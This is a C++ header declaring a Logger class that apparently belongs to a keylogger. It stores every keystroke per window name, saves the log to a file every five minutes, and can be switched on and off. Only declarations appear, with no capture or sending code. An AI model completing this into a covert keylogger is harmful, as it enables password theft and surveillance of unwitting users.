#pragma once

#include "Utilities.h"
#include <SFML/System.hpp>
#include "Keys.h"
#include <fstream>
#include <sstream>
#include <map>

using namespace sf;

const Time TIME_SAVE_LOG = seconds(60*5); // Every 5 minutes

class Logger
{
	// True if logger is running
	bool Active;

	// Hold the log of every pressed keys for every window
	map<string, string> Log;

	// Hold path name where to save log
	string Date;

	// Hold the keys map used to write down keys to log
	Keys Keys;

	// Hold time elapsed before last time log was saved
	Clock Timer;

	// Insert(string, string) : Insert into map the key stroke on the window
	void Insert(string window_name, string key_input);

	// Insert(string, int) : Insert into map the key stroke on the window
	void Insert(string window_name, int key_input);

public:

	// Logger() : Constructor of the Logger class
	Logger();

	// Add(string, int) : Add key stroke and the window name to Logger
	void Add(string window_name, int key_stroke);

	// Update() : Update the log date and save and clean log when date change
	void Update();

	// SaveToFile() : Save Map content to file
	void SaveToFile();

	// LoadFromFile() : Load file content to map
	bool LoadFromFile();

	// GetLog(string) : Return the key log for a specific window
	string GetLog(string window_name);

	// GetLog(string) : Return all the key log for all window
	string GetLog();

	// GetDate() : Return the the log date
	string GetDate() const;

	// SetDate(string) :  Set the dare of the log
	void SetDate(string date);

	// GetActive() : Return the log status attribut
	bool GetActive() const;

	// SetActive(bool) : Set the status attribut of log
	void SetActive(bool status);
};